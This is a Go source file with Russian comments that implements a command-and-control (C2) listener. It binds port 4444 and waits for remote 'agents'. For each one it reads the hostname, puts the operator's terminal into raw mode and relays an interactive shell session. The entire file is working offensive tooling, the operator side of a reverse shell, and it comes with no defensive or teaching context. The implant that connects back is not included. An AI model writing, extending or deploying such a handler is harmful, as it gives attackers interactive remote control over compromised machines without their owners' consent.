package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"syscall"
	"unsafe"
	"strings"
	"time"
)

var originalTermios syscall.Termios

func main() {
	// Запускаем TCP-слушатель
	listener, err := net.Listen("tcp", "0.0.0.0:4444")
	if err != nil {
		fmt.Println("Ошибка запуска сервера:", err)
		return
	}
	defer listener.Close()
	fmt.Println("[C2] Сервер запущен на порту 4444. Ожидание агентов...")

	// Бесконечный цикл приёма агентов
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Ошибка принятия соединения:", err)
			continue
		}
		fmt.Println("[+] Агент подключился")

		// Читаем приветствие (hostname)
		reader := bufio.NewReader(conn)
		firstLine, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Ошибка чтения приветствия:", err)
			conn.Close()
			continue
		}
		fmt.Printf("[+] Агент: %s\n", strings.TrimSpace(firstLine))

		// Сохраняем оригинальные настройки терминала
		fd := os.Stdin.Fd()
		syscall.Syscall(syscall.SYS_IOCTL, fd, syscall.TCGETS, uintptr(unsafe.Pointer(&originalTermios)))

		// Переводим терминал сервера в raw-режим
		err = setRawTerminalServer()
		if err != nil {
			fmt.Println("[-] Ошибка настройки терминала:", err)
		}

		// Переходим в интерактивный режим
		interactiveMode(conn)

		// Восстанавливаем терминал
		resetTerminalServer()

		fmt.Println("[+] Сессия с агентом завершена. Ожидание следующего агента...")
	}
}

// setRawTerminalServer переводит терминал сервера в raw-режим
func setRawTerminalServer() error {
	fd := os.Stdin.Fd()
	var termios syscall.Termios
	_, _, errno := syscall.Syscall(
		syscall.SYS_IOCTL,
		fd,
		syscall.TCGETS,
		uintptr(unsafe.Pointer(&termios)),
	)
	if errno != 0 {
		return fmt.Errorf("ошибка TCGETS: %v", errno)
	}

	// Отключаем эхо, канонический режим, обработку сигналов
	termios.Lflag &^= syscall.ECHO | syscall.ICANON | syscall.ISIG
	termios.Iflag &^= syscall.IXON | syscall.ICRNL
	termios.Oflag &^= syscall.OPOST
	termios.Cflag |= syscall.CS8

	_, _, errno = syscall.Syscall(
		syscall.SYS_IOCTL,
		fd,
		syscall.TCSETS,
		uintptr(unsafe.Pointer(&termios)),
	)
	if errno != 0 {
		return fmt.Errorf("ошибка TCSETS: %v", errno)
	}

	return nil
}

// resetTerminalServer восстанавливает исходный режим терминала
func resetTerminalServer() error {
	fd := os.Stdin.Fd()
	_, _, errno := syscall.Syscall(
		syscall.SYS_IOCTL,
		fd,
		syscall.TCSETS,
		uintptr(unsafe.Pointer(&originalTermios)),
	)
	if errno != 0 {
		return fmt.Errorf("ошибка восстановления терминала: %v", errno)
	}
	return nil
}

// interactiveMode ретранслирует данные между сетевым соединением и терминалом
func interactiveMode(conn net.Conn) {
	// Отключаем таймаут
	conn.SetReadDeadline(time.Time{})

	done := make(chan bool)

	// Горутина: сокет -> stdout (вывод на экран)
	go func() {
		buf := make([]byte, 4096)
		for {
			n, err := conn.Read(buf)
			if n > 0 {
				if _, writeErr := os.Stdout.Write(buf[:n]); writeErr != nil {
					done <- true
					return
				}
			}
			if err != nil {
				done <- true
				return
			}
		}
	}()

	// Горутина: stdin -> сокет (ввод с клавиатуры)
	go func() {
		buf := make([]byte, 4096)
		for {
			n, err := os.Stdin.Read(buf)
			if n > 0 {
				if _, writeErr := conn.Write(buf[:n]); writeErr != nil {
					done <- true
					return
				}
			}
			if err != nil {
				done <- true
				return
			}
		}
	}()

	// Ждём завершения любой из горутин
	<-done
	fmt.Println("\n[+] Выход из интерактивного режима")

	// Восстанавливаем таймаут
	conn.SetReadDeadline(time.Now().Add(60 * time.Second))
}
